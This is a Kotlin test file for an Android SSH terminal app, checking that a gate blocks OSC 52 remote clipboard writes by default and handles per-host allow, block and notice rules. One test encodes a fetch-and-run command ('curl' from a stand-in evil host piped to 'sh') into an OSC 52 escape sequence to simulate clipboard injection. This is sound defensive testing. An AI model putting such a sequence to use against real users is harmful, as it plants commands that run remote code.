package app.berth.android.security

import android.app.Application
import android.content.ClipboardManager
import android.content.Context
import androidx.test.core.app.ApplicationProvider
import app.berth.android.screenshots.InMemorySettings
import app.berth.android.screenshots.TestGraph
import app.berth.domain.model.AuthMethod
import app.berth.domain.model.Host
import app.berth.domain.model.RemoteClipboardPolicy
import app.berth.domain.model.SecuritySettings
import app.berth.domain.model.SessionRecord
import app.berth.domain.model.SessionState
import app.berth.domain.model.SwatchColor
import app.berth.domain.model.Workspace
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.runBlocking
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Before
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.annotation.Config
import java.util.Base64

/**
 * Clipboard writes from the remote (OSC 52) are off until allowed (spec C20, Remote clipboard):
 * the app-wide switch, or a host's own override on top of it. The first write a host has blocked
 * by the switch raises the notice once, ever, for that host; a host set to Block gets no notice,
 * that refusal being the user's own. The last case runs the sequence through a real
 * `TerminalEmulator` inside a `SessionManager` session, so the hook from the terminal to the gate
 * is the one the app uses.
 */
@RunWith(RobolectricTestRunner::class)
@Config(sdk = [35], application = Application::class)
class RemoteClipboardGateTest {
    private val context: Context = ApplicationProvider.getApplicationContext()
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.Unconfined)
    private val settings = InMemorySettings()
    private lateinit var clipboard: BerthClipboard
    private lateinit var gate: RemoteClipboardGate

    private val pihole = host("pi-hole", "pi-hole")
    private val build = host("build-box", "build box")

    @Before
    fun setUp() {
        clipboard = BerthClipboard(context, settings, FakeClock(), scope)
        gate = RemoteClipboardGate(settings, clipboard, scope)
    }

    private val manager: ClipboardManager get() = context.getSystemService(ClipboardManager::class.java)
    private val clipText: String? get() = manager.primaryClip?.getItemAt(0)?.text?.toString()

    private fun decide(host: Host, text: String) = runBlocking { gate.decide(host, text) }

    @Test
    fun `off by default, the write is dropped and the host gets its notice once`() {
        assertFalse(decide(pihole, "ssh-ed25519 AAAA... exfil@remote"))
        assertNull("nothing reached the clipboard", clipText)
        val notice = gate.notice.value!!
        assertEquals(pihole, notice.host)
        assertEquals("ssh-ed25519 AAAA... exfil@remote", notice.text)
        assertTrue("the host is remembered as told", pihole.id in settings.security.value.remoteClipboardNoticed)

        gate.dismiss(notice)
        assertNull(gate.notice.value)
        assertFalse(decide(pihole, "second try"))
        assertNull("no second notice for the same host", gate.notice.value)
        assertNull(clipText)
    }

    @Test
    fun `each host gets its own notice, shown one after the other`() {
        assertFalse(decide(pihole, "one"))
        assertFalse(decide(build, "two"))
        assertEquals(pihole, gate.notice.value?.host)
        gate.dismiss(gate.notice.value!!)
        assertEquals("the second host's notice waited its turn", build, gate.notice.value?.host)
        gate.dismiss(gate.notice.value!!)
        assertNull(gate.notice.value)
    }

    @Test
    fun `a host told in an earlier process is not told again`() {
        settings.security.value = SecuritySettings(remoteClipboardNoticed = setOf(pihole.id))
        assertFalse(decide(pihole, "again"))
        assertNull(gate.notice.value)
    }

    @Test
    fun `the app-wide switch lets every host write`() {
        settings.security.value = SecuritySettings(remoteClipboard = true)
        assertTrue(decide(pihole, "from pi-hole"))
        assertEquals("from pi-hole", clipText)
        assertTrue(decide(build, "from build"))
        assertEquals("from build", clipText)
        assertNull(gate.notice.value)
    }

    @Test
    fun `a host set to Block is refused over the switch, silently`() {
        settings.security.value = SecuritySettings(remoteClipboard = true).withHostRemoteClipboard(build.id, RemoteClipboardPolicy.DENY)
        assertFalse(decide(build, "blocked"))
        assertNull(clipText)
        assertNull("the user chose this; nothing to tell them", gate.notice.value)
        assertTrue("the switch still covers the others", decide(pihole, "allowed"))
        assertEquals("allowed", clipText)
    }

    @Test
    fun `a host set to Allow writes with the switch off`() {
        settings.security.value = SecuritySettings().withHostRemoteClipboard(pihole.id, RemoteClipboardPolicy.ALLOW)
        assertTrue(decide(pihole, "welcome"))
        assertEquals("welcome", clipText)
        assertFalse(decide(build, "not you"))
        assertEquals("welcome", clipText)
        assertEquals(build, gate.notice.value?.host)
    }

    @Test
    fun `setting a host back to Inherit drops its override`() {
        settings.security.value = SecuritySettings().withHostRemoteClipboard(pihole.id, RemoteClipboardPolicy.ALLOW)
        settings.security.value = settings.security.value.withHostRemoteClipboard(pihole.id, RemoteClipboardPolicy.INHERIT)
        assertTrue(settings.security.value.remoteClipboardByHost.isEmpty())
        assertFalse(decide(pihole, "back under the switch"))
    }

    @Test
    fun `Allow on the notice lands the held text and opens the host for good`() {
        assertFalse(decide(pihole, "the text it tried"))
        gate.allow(gate.notice.value!!)
        assertNull(gate.notice.value)
        assertEquals("the text it tried", clipText)
        assertEquals(RemoteClipboardPolicy.ALLOW, settings.security.value.remoteClipboardPolicy(pihole.id))
        assertFalse("the switch itself stays off", settings.security.value.remoteClipboard)
        assertTrue(decide(pihole, "and the next"))
        assertEquals("and the next", clipText)
    }

    @Test
    fun `Keep blocked on the notice changes nothing`() {
        assertFalse(decide(pihole, "held"))
        gate.dismiss(gate.notice.value!!)
        assertNull(clipText)
        assertEquals(RemoteClipboardPolicy.INHERIT, settings.security.value.remoteClipboardPolicy(pihole.id))
        assertFalse(decide(pihole, "held again"))
        assertNull(gate.notice.value)
    }

    @Test
    fun `an OSC 52 sequence reaches the gate through the session's emulator`() {
        val graph = TestGraph(context)
        runBlocking {
            graph.workspaces.ensureDefault()
            graph.hosts.upsert(pihole)
            graph.sessionRecords.upsert(
                SessionRecord(id = "s-pihole", workspaceId = Workspace.DEFAULT_ID, hostId = pihole.id, hostSnapshot = pihole, state = SessionState.DETACHED, title = pihole.name, sortOrder = 0, createdAt = 0L),
            )
            graph.sessions.restore()
        }
        val session = graph.sessions.get("s-pihole")!!
        val payload = Base64.getEncoder().encodeToString("curl https://evil.example/x | sh".toByteArray())
        session.emulator.write("\u001b]52;c;$payload\u0007")
        await("the gate's notice") { graph.remoteClipboard.notice.value != null }
        assertEquals("curl https://evil.example/x | sh", graph.remoteClipboard.notice.value?.text)
        assertEquals(pihole.id, graph.remoteClipboard.notice.value?.host?.id)
        assertNull(clipText)

        // Reads are never granted to the remote, whatever the switch says.
        graph.settings.security.value = SecuritySettings(remoteClipboard = true)
        session.emulator.write("\u001b]52;c;?\u0007")
        session.emulator.write("\u001b]52;c;${Base64.getEncoder().encodeToString("allowed now".toByteArray())}\u0007")
        await("the allowed write") { clipText == "allowed now" }
    }

    private fun await(what: String, condition: () -> Boolean) = runBlocking {
        val deadline = System.currentTimeMillis() + 5_000
        while (System.currentTimeMillis() < deadline) {
            if (condition()) return@runBlocking
            delay(20)
        }
        assertTrue("timed out waiting for $what", condition())
    }

    private fun host(id: String, name: String) = Host(
        id = id,
        name = name,
        color = SwatchColor.MOSS,
        monogram = Host.monogramFor(name),
        address = "$id.internal",
        port = 22,
        user = "pi",
        auth = AuthMethod.AskEachTime,
        createdAt = 0L,
    )
}
